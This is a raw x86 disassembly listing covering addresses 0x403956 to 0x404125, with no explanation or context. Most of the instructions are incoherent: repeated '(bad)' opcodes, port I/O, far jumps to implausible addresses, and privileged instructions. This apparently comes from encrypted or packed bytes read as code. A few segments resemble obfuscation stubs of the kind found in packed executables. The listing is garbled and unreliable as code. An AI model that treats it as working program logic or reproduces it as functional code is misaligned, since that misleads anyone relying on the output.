  403956:	or     bh,dh
  403958:	test   BYTE PTR [eax],dh
  40395a:	pop    edi
  40395b:	mov    bl,0x26
  40395d:	mov    dl,0x54
  40395f:	popa   
  403960:	fsubr  QWORD PTR [edx+ecx*2-0x78]
  403964:	call   DWORD PTR [ecx]
  403966:	ror    BYTE PTR [edi+ecx*8],1
  403969:	dec    eax
  40396a:	xchg   edi,eax
  40396b:	(bad)  
  40396c:	dec    ebp
  40396d:	(bad)  
  40396e:	jmp    0x9c2bef39
  403973:	xchg   DWORD PTR [esi],ebx
  403975:	adc    al,0xc1
  403977:	mov    BYTE PTR [edx-0x5f18c9e7],dh
  40397d:	sbb    dh,BYTE PTR [edx-0x9924623]
  403983:	std    
  403984:	in     al,dx
  403985:	lss    edx,FWORD PTR [edi-0x4c968a32]
  40398c:	out    0x77,eax
  40398e:	loop   0x403973
  403990:	sub    DWORD PTR [esi],ebx
  403992:	inc    esp
  403993:	fnsave [esi-0xc]
  403996:	inc    edx
  403997:	inc    edx
  403998:	xchg   edx,eax
  403999:	(bad)  
  40399a:	hlt    
  40399b:	push   ebp
  40399c:	mov    ah,0xc1
  40399e:	test   DWORD PTR [eax+0x63],edi
  4039a1:	js     0x4039d5
  4039a3:	(bad)  
  4039a5:	mov    BYTE PTR [eax+0x58],bl
  4039a8:	stc    
  4039a9:	clc    
  4039aa:	lea    ecx,[esi]
  4039ac:	je     0x4039cf
  4039ae:	retf   
  4039af:	mov    ecx,0x4f8b96c9
  4039b4:	push   ss
  4039b5:	or     BYTE PTR [edi+edx*1-0x2b],ch
  4039b9:	mov    dl,BYTE PTR [eax]
  4039bb:	and    al,0xd3
  4039bd:	or     al,0x6b
  4039bf:	push   0x4c37f073
  4039c4:	mov    bl,0xa6
  4039c6:	leave  
  4039c7:	rol    DWORD PTR [eax],0x3
  4039ca:	sbb    eax,0xe77fe87c
  4039cf:	lods   al,BYTE PTR ds:[esi]
  4039d0:	(bad)  
  4039d1:	dec    esp
  4039d2:	cmp    eax,0xd7203c9e
  4039d7:	mov    cl,0x13
  4039d9:	mov    ds:0x6ca20055,eax
  4039de:	out    dx,al
  4039df:	sbb    DWORD PTR [ebp+0x30],ebx
  4039e2:	dec    ecx
  4039e3:	jg     0x4039fa
  4039e5:	add    al,0x17
  4039e7:	push   es
  4039e8:	xlat   BYTE PTR ds:[ebx]
  4039e9:	neg    DWORD PTR [ebp+eiz*4+0x2c98a94]
  4039f0:	sbb    al,0xec
  4039f2:	imul   ecx,DWORD PTR [ebx],0x8055cffc
  4039f8:	pop    ebp
  4039f9:	adc    DWORD PTR [ebp-0x6c33cf2b],0xc979ff66
  403a03:	repz xor DWORD PTR [esi],esi
  403a06:	imul   ebx,DWORD PTR [ecx-0x44],0x60
  403a0a:	mov    esi,0x3e0729fa
  403a0f:	mov    ah,0xff
  403a11:	sahf   
  403a12:	mov    bh,cl
  403a14:	or     dh,bh
  403a16:	out    dx,eax
  403a17:	mov    dl,al
  403a19:	and    ecx,ebx
  403a1b:	lock arpl WORD PTR [esi-0x5c],si
  403a1f:	out    dx,al
  403a20:	xor    dh,ch
  403a22:	(bad)  [esi-0x3b]
  403a25:	dec    edi
  403a26:	fisubr DWORD PTR [eax]
  403a28:	loope  0x403a72
  403a2a:	in     al,dx
  403a2b:	imul   DWORD PTR [edx]
  403a2d:	scas   al,BYTE PTR es:[edi]
  403a2e:	pop    ecx
  403a2f:	mov    edi,0xc20bf903
  403a34:	or     esi,ebx
  403a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a37:	or     eax,0x89d58b3a
  403a3c:	cwde   
  403a3d:	jne    0x403a05
  403a3f:	sbb    edx,eax
  403a41:	adc    dh,BYTE PTR [edx+ebx*8]
  403a44:	inc    ebx
  403a45:	ret    
  403a46:	in     eax,0xd6
  403a48:	std    
  403a49:	mov    ah,0xfd
  403a4b:	fneni(8087 only) 
  403a4d:	lea    esp,[eax]
  403a4f:	test   eax,0x18527f26
  403a54:	mov    dl,0xe8
  403a56:	arpl   WORD PTR [edx+0x21],sp
  403a59:	loope  0x403ac3
  403a5b:	cdq    
  403a5c:	pop    edx
  403a5d:	gs push ebx
  403a5f:	or     eax,0x68ee5dfb
  403a64:	push   eax
  403a65:	pop    esp
  403a66:	aas    
  403a67:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a69:	loopne 0x403a05
  403a6b:	and    eax,0x5f546956
  403a70:	sub    eax,0xb1ef3b5
  403a75:	inc    edi
  403a76:	aas    
  403a77:	or     eax,0xa5ceffed
  403a7c:	pop    ebx
  403a7d:	xchg   ebp,eax
  403a7e:	inc    esi
  403a7f:	sub    esp,0x2d
  403a82:	hlt    
  403a83:	pop    ds
  403a84:	iret   
  403a85:	xor    BYTE PTR [ebp+esi*1-0x20],bh
  403a89:	add    eax,esp
  403a8b:	fwait
  403a8c:	mov    cl,BYTE PTR [ebp-0x54a24ac7]
  403a92:	rcl    BYTE PTR [ebx+0x684dd768],0x17
  403a99:	retf   
  403a9a:	sub    eax,0x60d9eae3
  403a9f:	aas    
  403aa0:	push   ecx
  403aa1:	(bad)  
  403aa2:	scas   eax,DWORD PTR es:[edi]
  403aa3:	cs sub al,0x5
  403aa6:	enter  0x32f7,0x6e
  403aaa:	inc    ebx
  403aab:	pop    ebx
  403aac:	sbb    BYTE PTR [eax],0xca
  403aaf:	jle    0x403abc
  403ab1:	es or  edi,ecx
  403ab4:	sub    ebp,ebx
  403ab6:	aad    0xdb
  403ab8:	in     al,dx
  403ab9:	dec    ebp
  403aba:	jnp    0x403a82
  403abc:	push   esp
  403abd:	inc    esp
  403abe:	call   0xcf41:0xe5850981
  403ac5:	out    dx,al
  403ac6:	xchg   edx,eax
  403ac7:	daa    
  403ac8:	pusha  
  403ac9:	inc    edx
  403aca:	sbb    BYTE PTR [ebp+0x71],bl
  403acd:	enter  0xc0a5,0xc4
  403ad1:	dec    ebx
  403ad2:	push   ss
  403ad3:	ins    BYTE PTR es:[edi],dx
  403ad4:	(bad)
  403ad8:	add    esi,DWORD PTR [ebp+0x1a33804a]
  403ade:	pop    edx
  403adf:	jo     0x403b11
  403ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae2:	pop    ss
  403ae3:	in     al,dx
  403ae4:	cwde   
  403ae5:	jae    0x403b29
  403ae7:	call   0xc7cd:0xb27238c4
  403aee:	lea    eax,ds:0xfff458a
  403af4:	mov    bh,0xd
  403af6:	imul   esp,esi,0x42
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fcf6
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e0a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fc7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fc75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x4cb7769],esi
  403b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x9870707d
  403b48:	popf   
  403b49:	adc    dl,BYTE PTR [eax-0x51]
  403b4c:	pushf  
  403b4d:	pop    ds
  403b4e:	sbb    BYTE PTR [ebx+0x302ff219],dl
  403b54:	and    ah,BYTE PTR [edi-0xdc66aa3]
  403b5a:	sub    eax,0x19ef7e66
  403b5f:	push   DWORD PTR [ebp+0x5f3cd459]
  403b65:	jae    0x403af6
  403b67:	inc    ebx
  403b68:	cmp    esp,DWORD PTR [edi+0x5d]
  403b6b:	xchg   ebp,eax
  403b6c:	jno    0x403bbf
  403b6e:	cdq    
  403b6f:	in     al,dx
  403b70:	stos   DWORD PTR es:[edi],eax
  403b71:	cmp    ebx,DWORD PTR [edx]
  403b73:	xchg   ecx,eax
  403b74:	mov    cl,0x20
  403b76:	test   al,0xf4
  403b78:	jo     0x403bee
  403b7a:	hlt    
  403b7b:	stc    
  403b7c:	(bad)  
  403b7d:	lds    eax,FWORD PTR es:[ebp+0x6e]
  403b81:	xchg   DWORD PTR [ebx+0x6beda99b],ebx
  403b87:	pop    ebp
  403b88:	ins    BYTE PTR es:[edi],dx
  403b89:	inc    edx
  403b8a:	or     DWORD PTR [ebp+0x1a],ebp
  403b8d:	outs   dx,BYTE PTR ds:[esi]
  403b8e:	xchg   ah,bh
  403b90:	xchg   ecx,eax
  403b91:	dec    ebp
  403b92:	mov    eax,0x1cff4bdb
  403b97:	(bad)  
  403b98:	test   eax,0x8e7d8664
  403b9d:	and    eax,0x4bf006c0
  403ba2:	std    
  403ba3:	push   ss
  403ba4:	leave  
  403ba5:	scas   al,BYTE PTR es:[edi]
  403ba6:	xor    edi,0x2b
  403ba9:	mov    eax,0x9f6b78f2
  403bae:	retf   
  403baf:	xor    eax,0xdaaf3b40
  403bb4:	jne    0x403bf9
  403bb6:	icebp  
  403bb7:	test   esp,0xc0de6e5c
  403bbd:	iret   
  403bbe:	imul   edx,DWORD PTR [ebp+ebx*2-0x84e5474],0xb6d7819d
  403bc9:	mov    ebx,DWORD PTR [edx+0x393a0c3e]
  403bcf:	adc    BYTE PTR [edx+0x36e78fc5],ch
  403bd5:	push   eax
  403bd6:	fiadd  DWORD PTR [ebp-0x57]
  403bd9:	mov    ch,0x4e
  403bdb:	push   ecx
  403bdc:	ror    BYTE PTR ds:0xe4164f0c,cl
  403be2:	mov    esp,0x1be1f932
  403be7:	mov    ds:0xee372b33,eax
  403bec:	xor    BYTE PTR [ecx-0xfaa8e24],bl
  403bf2:	in     eax,0xe
  403bf4:	jg     0x403b77
  403bf6:	xor    bh,BYTE PTR [ecx]
  403bf8:	call   0x42f48a8
  403bfd:	xchg   ebx,eax
  403bfe:	nop
  403bff:	xrelease mov BYTE PTR [edx+ebp*2-0x7826a452],0x81
  403c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c09:	sti    
  403c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c0b:	push   ds
  403c0c:	dec    edx
  403c0d:	xchg   esi,eax
  403c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c0f:	mov    DWORD PTR [edx],esp
  403c11:	rol    DWORD PTR [edi-0x4a],1
  403c14:	jl     0x403c68
  403c16:	mov    cl,0x93
  403c18:	adc    ecx,ecx
  403c1a:	sub    BYTE PTR [esi+0x5ad713cd],ch
  403c20:	push   esi
  403c21:	lock inc esp
  403c23:	jecxz  0x403c6a
  403c25:	ins    BYTE PTR es:[edi],dx
  403c26:	add    eax,0x5f0657a8
  403c2b:	xor    ch,0x51
  403c2e:	cli    
  403c2f:	and    al,0x3b
  403c31:	push   es
  403c32:	fmul   st(1),st
  403c34:	das    
  403c35:	push   ss
  403c36:	or     al,0x52
  403c38:	pop    edi
  403c39:	mov    bh,dh
  403c3b:	mov    eax,0x79b0b6a5
  403c40:	das    
  403c41:	data16 sbb BYTE PTR [esi+0x16951432],al
  403c48:	loop   0x403bec
  403c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c4b:	dec    eax
  403c4c:	cmp    dl,ah
  403c4e:	(bad)  
  403c4f:	cwde   
  403c50:	imul   edx,eax,0xdb9bccd5
  403c56:	fcom   st(3)
  403c58:	clc    
  403c59:	(bad)
  403c5d:	shr    DWORD PTR [edi],1
  403c5f:	fs pop ds
  403c61:	pop    esp
  403c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c63:	push   ss
  403c64:	ja     0x403c6e
  403c66:	leave  
  403c67:	adc    di,WORD PTR [ebx-0xe23e553]
  403c6e:	rcl    dl,cl
  403c70:	cmp    ebx,edx
  403c72:	cmp    al,0xd4
  403c75:	cld    
  403c76:	mov    edx,0x7c9a7a9d
  403c7b:	jns    0x403c01
  403c7d:	inc    ecx
  403c7e:	imul   ebx,DWORD PTR [edx+esi*1],0x83abf054
  403c85:	icebp  
  403c86:	ret    0x5f31
  403c89:	not    DWORD PTR [edx-0x6b913f87]
  403c8f:	or     dl,al
  403c91:	adc    cl,cl
  403c93:	pushf  
  403c94:	mov    eax,ds:0x2869a891
  403c99:	jmp    0xc0c2d388
  403c9e:	imul   ecx,edx,0xffffffbf
  403ca1:	inc    esi
  403ca2:	cmc    
  403ca3:	jo     0x403ca7
  403ca5:	mov    eax,ds:0x9aea9493
  403caa:	xor    dl,BYTE PTR ds:0xda4e026c
  403cb0:	les    ebx,FWORD PTR [eax]
  403cb2:	pop    edx
  403cb3:	mov    ds:0x6a0c278d,eax
  403cb8:	and    eax,0xb83f54c2
  403cbd:	xchg   eax,eax
  403cbf:	push   eax
  403cc0:	pop    ebp
  403cc1:	push   0x70
  403cc3:	int    0xf
  403cc5:	dec    ecx
  403cc6:	or     al,0x41
  403cc8:	shr    BYTE PTR [esi+0x2a],0x90
  403ccc:	scas   al,BYTE PTR es:[edi]
  403ccd:	sbb    bl,ah
  403ccf:	(bad)  [esp+esi*1+0x42]
  403cd3:	jl     0x403ca8
  403cd5:	dec    esp
  403cd6:	mov    dl,0x29
  403cd8:	xchg   ebx,eax
  403cd9:	(bad)  
  403cda:	imul   ebp,edi,0xc7a2c6d9
  403ce0:	and    al,0x3c
  403ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce3:	or     DWORD PTR [esi-0x63ff230],edi
  403ce9:	add    al,0x1d
  403ceb:	loopne 0x403c87
  403ced:	add    eax,DWORD PTR [ecx]
  403cef:	mov    eax,0xd2c6361b
  403cf4:	push   0x70
  403cf6:	loop   0x403d6d
  403cf8:	(bad)  
  403cf9:	dec    ebp
  403cfa:	cs ds xchg esp,eax
  403cfd:	and    ah,bh
  403cff:	push   esp
  403d00:	int3   
  403d01:	add    eax,0xceb9c871
  403d06:	sbb    esi,edx
  403d08:	mov    edi,0x814eb8aa
  403d0d:	jno    0x403cca
  403d0f:	(bad)  
  403d10:	jmp    0x403d6f
  403d12:	pop    ds
  403d13:	loopne 0x403d3c
  403d15:	scas   al,BYTE PTR es:[edi]
  403d16:	pop    ss
  403d17:	or     eax,0x6e402fe8
  403d1c:	test   BYTE PTR [eax],ah
  403d1e:	mov    ds:0xbaf0d899,eax
  403d23:	jnp    0x403d0a
  403d25:	das    
  403d26:	ins    DWORD PTR es:[edi],dx
  403d27:	mov    WORD PTR [ecx-0x8db4578],?
  403d2d:	mov    edi,0x97fca38a
  403d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d33:	sbb    DWORD PTR ds:0x35c62d0e,esi
  403d39:	push   esi
  403d3a:	mov    edx,0xcbbfefe4
  403d3f:	adc    eax,0x96b47d83
  403d44:	xor    DWORD PTR [ebp-0x7e],0x4f
  403d48:	mov    ebx,0xf8b28d08
  403d4d:	int    0x5e
  403d4f:	dec    eax
  403d50:	mov    ds:0x559b8098,al
  403d55:	cmp    esi,DWORD PTR [esi]
  403d57:	push   ss
  403d58:	mov    al,ds:0x187ed671
  403d5d:	cmp    eax,0xec296b14
  403d62:	loope  0x403d6d
  403d64:	xchg   esp,eax
  403d65:	xchg   DWORD PTR [ecx-0x6f],edi
  403d68:	dec    esp
  403d69:	push   ebx
  403d6a:	fwait
  403d6b:	adc    al,dl
  403d6d:	and    BYTE PTR [ecx+eiz*1+0x5],bh
  403d71:	lea    eax,[esp+ecx*2-0xc]
  403d75:	ins    BYTE PTR es:[edi],dx
  403d76:	mov    edx,0x4e7fc670
  403d7b:	fld    TBYTE PTR [ebp-0x75e66d3c]
  403d81:	xchg   esi,eax
  403d82:	cli    
  403d83:	test   BYTE PTR [eax+0x5b33147f],cl
  403d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d8a:	enter  0x259d,0x2e
  403d8e:	xchg   ecx,eax
  403d8f:	fadd   QWORD PTR [edx+0x59ff3b00]
  403d95:	mov    edi,0x5ff7daaa
  403d9a:	mov    eax,ds:0xd302f700
  403d9f:	sub    DWORD PTR [esi],esi
  403da1:	and    ecx,DWORD PTR [ebx+eax*8]
  403da4:	sub    eax,0xadcaafb5
  403da9:	mov    WORD PTR ds:0x75dce035,gs
  403daf:	adc    eax,0x4fda5795
  403db4:	mov    ebx,esi
  403db6:	setno  BYTE PTR [ecx]
  403db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dbb:	sbb    al,0x29
  403dbd:	dec    ebx
  403dbe:	pop    edi
  403dbf:	test   eax,0x5af89c02
  403dc4:	pop    ds
  403dc5:	pop    ds
  403dc6:	add    ah,cl
  403dc8:	fisttp DWORD PTR [esi+0x19]
  403dcb:	mov    bl,0xcf
  403dcd:	jp     0x403d94
  403dcf:	jns    0x403df4
  403dd1:	pop    ebx
  403dd2:	repz and bh,0x8d
  403dd6:	xor    esi,DWORD PTR [ebp-0x3e]
  403dd9:	inc    ebx
  403dda:	xor    ah,BYTE PTR [ebp-0x3f]
  403ddd:	xchg   DWORD PTR [edi],ebp
  403ddf:	stos   BYTE PTR es:[edi],al
  403de0:	pop    esp
  403de1:	add    esi,DWORD PTR [edi+0x20]
  403de4:	or     ebx,DWORD PTR [esi+0x69]
  403de7:	push   eax
  403de8:	test   BYTE PTR [ebx+0x1f],ah
  403deb:	aaa    
  403dec:	out    0x23,al
  403dee:	sbb    eax,0x5c055605
  403df3:	mov    ebp,0xaf87e337
  403df8:	cmp    bl,BYTE PTR [ebx+0xa]
  403dfb:	sbb    BYTE PTR [edi+ebx*8],ch
  403dfe:	lods   al,BYTE PTR ds:[esi]
  403dff:	fidivr DWORD PTR [esi]
  403e01:	xchg   esi,eax
  403e02:	inc    esp
  403e03:	sub    eax,0xde9029ec
  403e08:	push   ds
  403e09:	cdq    
  403e0a:	and    DWORD PTR [edx],esi
  403e0c:	(bad)  
  403e0d:	hlt    
  403e0e:	scas   eax,DWORD PTR es:[edi]
  403e0f:	sub    eax,DWORD PTR [ecx]
  403e11:	mov    DWORD PTR [esi+0x2450bb31],ecx
  403e17:	add    dl,BYTE PTR [ebx]
  403e19:	outs   dx,BYTE PTR ds:[esi]
  403e1a:	lods   eax,DWORD PTR ds:[esi]
  403e1b:	enter  0xc641,0xa3
  403e1f:	adc    esp,DWORD PTR [ecx+0x327357ef]
  403e25:	cli    
  403e26:	mov    DWORD PTR [ebx-0x6b],edx
  403e29:	into   
  403e2a:	sbb    dl,BYTE PTR [eax-0x67832c90]
  403e30:	and    cl,BYTE PTR [eax-0x1b]
  403e33:	out    dx,eax
  403e34:	leave  
  403e35:	adc    DWORD PTR [edx+ecx*2-0x7a],ebx
  403e39:	jns    0x403e7a
  403e3b:	inc    esp
  403e3d:	xor    al,0x1f
  403e3f:	cmp    eax,eax
  403e41:	cld    
  403e42:	xor    DWORD PTR [ebx-0x76],esi
  403e45:	inc    edx
  403e46:	jmp    0x5907:0xf71ac6ab
  403e4d:	jnp    0x403ea8
  403e4f:	mov    bh,0x88
  403e51:	hlt    
  403e52:	lods   al,BYTE PTR ds:[esi]
  403e53:	in     eax,dx
  403e54:	mov    edi,DWORD PTR ds:0x1a52e254
  403e5a:	(bad)  
  403e5b:	inc    esi
  403e5c:	push   ds
  403e5d:	pop    ds
  403e5e:	aaa    
  403e5f:	(bad)  
  403e60:	push   ss
  403e61:	mov    ds:0xf9307630,eax
  403e66:	xor    BYTE PTR [edx+0x30],0x41
  403e6a:	aam    0x67
  403e6c:	xchg   ebx,eax
  403e6d:	imul   ebp,DWORD PTR [edx-0x30806f0c],0x23
  403e74:	or     esi,DWORD PTR [ebx]
  403e76:	rcl    DWORD PTR [esi-0x1c],cl
  403e79:	add    cl,cl
  403e7b:	jb     0x403e6f
  403e7d:	push   esp
  403e7e:	push   edx
  403e7f:	sahf   
  403e80:	fstp   st(3)
  403e82:	xor    DWORD PTR [edx*1+0x4dd08fe0],ebx
  403e89:	sub    eax,edi
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e09c
  403ea2:	adc    DWORD PTR ds:0x42e68f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fcf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fc85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e66f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x3751c35
  403eec:	inc    edx
  403eed:	icebp  
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ea7
  403ef7:	push   edi
  403ef8:	adc    BYTE PTR [edx-0x7d],0xcb
  403efc:	add    al,0xf9
  403efe:	or     ah,BYTE PTR [edi]
  403f00:	mov    esi,0x7f606e58
  403f05:	jmp    0x403eef
  403f07:	mov    esp,DWORD PTR [ebx+edx*4]
  403f0a:	push   edx
  403f0b:	inc    esp
  403f0c:	les    esp,FWORD PTR ds:0xeb830003
  403f12:	xchg   ebx,eax
  403f13:	xor    esp,ebx
  403f15:	jl     0x403eb6
  403f17:	jp     0x403f49
  403f19:	shl    DWORD PTR [edi-0x3e363e95],0x23
  403f20:	aam    0xef
  403f22:	fsubr  DWORD PTR [edi-0x65]
  403f25:	mov    edi,0x831b517e
  403f2a:	or     ecx,eax
  403f2c:	xchg   ebx,eax
  403f2d:	xchg   ebx,eax
  403f2e:	cld    
  403f2f:	xchg   edx,eax
  403f30:	loopne 0x403f5f
  403f32:	or     eax,0xf6914aab
  403f37:	out    0x27,eax
  403f39:	cld    
  403f3a:	inc    eax
  403f3b:	shl    edx,1
  403f3d:	ud0    esi,DWORD PTR [ecx+eiz*2+0x62d6bebc]
  403f45:	loope  0x403f44
  403f47:	sub    al,0x17
  403f49:	xchg   ebx,eax
  403f4a:	xchg   edx,eax
  403f4b:	mov    dh,BYTE PTR [ecx+edx*8-0x64]
  403f4f:	pop    esi
  403f50:	iret   
  403f51:	scas   eax,DWORD PTR es:[edi]
  403f52:	test   eax,0x3fa3cac3
  403f57:	(bad)  
  403f58:	mov    eax,ds:0x3c3752b8
  403f5d:	dec    ecx
  403f5e:	jb     0x403f04
  403f60:	sub    dh,BYTE PTR [ebp+edx*2-0x29]
  403f64:	add    BYTE PTR [ecx],al
  403f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f67:	repz sbb ecx,DWORD PTR [edx-0x11e7eed4]
  403f6e:	push   ecx
  403f6f:	push   eax
  403f70:	test   BYTE PTR [eax-0x16],bh
  403f73:	xlat   BYTE PTR ds:[ebx]
  403f74:	xchg   esi,eax
  403f75:	lea    eax,[edx]
  403f77:	and    ah,al
  403f79:	lods   al,BYTE PTR ds:[esi]
  403f7a:	inc    edi
  403f7b:	pop    edi
  403f7c:	addr16 and al,0x40
  403f7f:	lea    eax,[ecx-0x5f]
  403f82:	mov    eax,0xbf4c6ae0
  403f87:	test   al,0xae
  403f89:	inc    esp
  403f8a:	adc    al,0xd0
  403f8c:	pop    ds
  403f8d:	sbb    ch,BYTE PTR [edx-0x4ecb900b]
  403f93:	push   0x435413e1
  403f98:	mov    al,ds:0x5fc5fd00
  403f9d:	mov    dl,0x7e
  403f9f:	cwde   
  403fa0:	gs mov ch,0xdc
  403fa3:	sbb    al,0x61
  403fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa6:	dec    edi
  403fa7:	mov    ch,0x4
  403fa9:	mov    eax,0x796d624b
  403fae:	xor    dh,BYTE PTR cs:[edi+0x37035fd7]
  403fb5:	add    DWORD PTR [ebx+0x601bf539],edi
  403fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fbc:	mov    al,ds:0x9383805
  403fc1:	jae    0x404026
  403fc3:	xor    eax,0x925f96ef
  403fc8:	xchg   ecx,eax
  403fc9:	test   eax,0x4037e6aa
  403fce:	in     eax,0x63
  403fd0:	clc    
  403fd1:	push   esi
  403fd2:	loopne 0x403fb8
  403fd4:	sti    
  403fd5:	in     eax,dx
  403fd6:	pop    es
  403fd7:	clc    
  403fd8:	leave  
  403fd9:	lahf   
  403fda:	cmc    
  403fdb:	scas   al,BYTE PTR es:[edi]
  403fdc:	(bad)  
  403fdd:	(bad)  
  403fde:	rcl    BYTE PTR [ecx],1
  403fe0:	popa   
  403fe1:	sbb    BYTE PTR [esi],bh
  403fe3:	sbb    eax,edi
  403fe5:	out    0x3a,eax
  403fe7:	ss mov bh,0x48
  403fea:	jmp    0x40405f
  403fec:	mov    ecx,0xbcf14c5c
  403ff1:	in     al,dx
  403ff2:	mov    BYTE PTR [edi+0x10c09eb1],0xde
  403ff9:	add    al,BYTE PTR [esi+esi*4-0x2d]
  403ffd:	adc    ebp,DWORD PTR [eax+ecx*2-0x1e]
  404001:	xchg   ecx,eax
  404002:	pop    ebp
  404003:	mov    bh,0x1d
  404005:	inc    esi
  404006:	enter  0xedcb,0xac
  40400a:	retf   
  40400b:	je     0x404026
  40400d:	sbb    ebx,DWORD PTR [edi+0x1d]
  404010:	and    bh,BYTE PTR [eax+0x5d]
  404013:	fsubr  st,st(4)
  404015:	inc    esi
  404016:	in     al,dx
  404017:	fist   WORD PTR [esi-0x32]
  40401a:	adc    edx,DWORD PTR [ebp-0x23]
  40401d:	outs   dx,BYTE PTR ds:[esi]
  40401e:	repnz sbb edi,edi
  404021:	loop   0x40402f
  404023:	ja     0x403fc8
  404025:	int3   
  404026:	or     BYTE PTR [ecx+ecx*2+0x522f8581],cl
  40402d:	or     DWORD PTR [ebx],ebp
  40402f:	or     BYTE PTR [ebx-0x33dda1de],cl
  404035:	pushf  
  404036:	add    DWORD PTR [esi+0x38],ebp
  404039:	inc    ebx
  40403a:	ss popf 
  40403c:	xchg   esp,eax
  40403d:	pop    edi
  40403e:	int    0x26
  404040:	or     DWORD PTR [edx+0x11fa814a],ebx
  404046:	int    0xd1
  404048:	ret    
  404049:	mov    ecx,0x59012468
  40404e:	push   ebp
  40404f:	fbstp  TBYTE PTR [edx-0x74750edc]
  404055:	mov    ecx,0x142fbfe0
  40405a:	test   edi,esp
  40405c:	adc    ebp,ecx
  40405e:	sbb    DWORD PTR [esi+0x50],0x37c786ae
  404065:	scas   eax,DWORD PTR es:[edi]
  404066:	jle    0x404029
  404068:	dec    ebx
  404069:	mov    al,ds:0x4cba2661
  40406e:	xchg   ecx,eax
  40406f:	jns    0x404023
  404071:	mov    ebx,0x71c56fc7
  404076:	aas    
  404077:	xchg   ebp,eax
  404078:	dec    ebx
  404079:	out    dx,eax
  40407a:	sar    DWORD PTR [ecx-0x6e],cl
  40407d:	aam    0x57
  40407f:	jle    0x40406b
  404081:	ret    
  404082:	imul   edi,ebp,0x1
  404085:	mov    edx,eax
  404087:	sub    ah,al
  404089:	lods   al,BYTE PTR ds:[esi]
  40408a:	aam    0xb5
  40408c:	ret    0x1661
  40408f:	push   ss
  404090:	jb     0x404111
  404092:	xchg   BYTE PTR [ebx+0xb791c03],ah
  404098:	inc    edx
  404099:	mov    ebp,0xea172b05
  40409e:	cli    
  40409f:	fs mov esp,0xf5953c09
  4040a5:	jo     0x4040a0
  4040a7:	pop    eax
  4040a8:	pop    eax
  4040a9:	pop    esp
  4040aa:	or     eax,0x6c419ca4
  4040af:	dec    esi
  4040b0:	add    al,0x3e
  4040b2:	cmp    BYTE PTR [ebp+0x15],dl
  4040b5:	add    DWORD PTR [esi+0x27db705f],ebp
  4040bb:	pop    esi
  4040bc:	ins    BYTE PTR es:[edi],dx
  4040bd:	mov    esi,0x3598bafd
  4040c2:	xor    eax,0x826489d8
  4040c7:	jmp    0x4040e6
  4040c9:	push   ebx
  4040ca:	mov    dl,0x8f
  4040cc:	mov    esp,0x8e12340
  4040d1:	imul   edx,DWORD PTR [eax-0x7d],0x75
  4040d5:	fild   QWORD PTR [esi+0x20aaf20e]
  4040db:	ss (bad) 
  4040dd:	shl    edx,cl
  4040df:	sub    al,0xac
  4040e1:	cmp    BYTE PTR [ecx-0x456e264b],al
  4040e7:	rol    BYTE PTR ds:0xa9c84c40,1
  4040ed:	gs mov ebx,0xc4bdac20
  4040f3:	jl     0x404099
  4040f5:	(bad)  
  4040f7:	fadd   DWORD PTR [ecx-0x6b]
  4040fa:	push   es
  4040fb:	(bad)  
  4040fc:	or     al,BYTE PTR [ebp+ebx*1-0x1c]
  404100:	repnz and BYTE PTR [ebp-0x20],dh
  404104:	mov    edx,edi
  404106:	cdq    
  404107:	xor    cl,bl
  404109:	outs   dx,BYTE PTR ds:[esi]
  40410a:	not    BYTE PTR [ebp+0x6d80bc69]
  404110:	pop    edi
  404111:	push   ds
  404112:	sub    BYTE PTR [eax],cl
  404114:	rcl    DWORD PTR [ebp-0x24d97685],cl
  40411a:	popa   
  40411b:	cmp    ebp,esi
  40411d:	mov    ch,0xc3
  40411f:	cmp    eax,0x2376df3a
  404124:	scas   al,BYTE PTR es:[edi]
  404125:	sub    ah,BYTE PTR [eax]
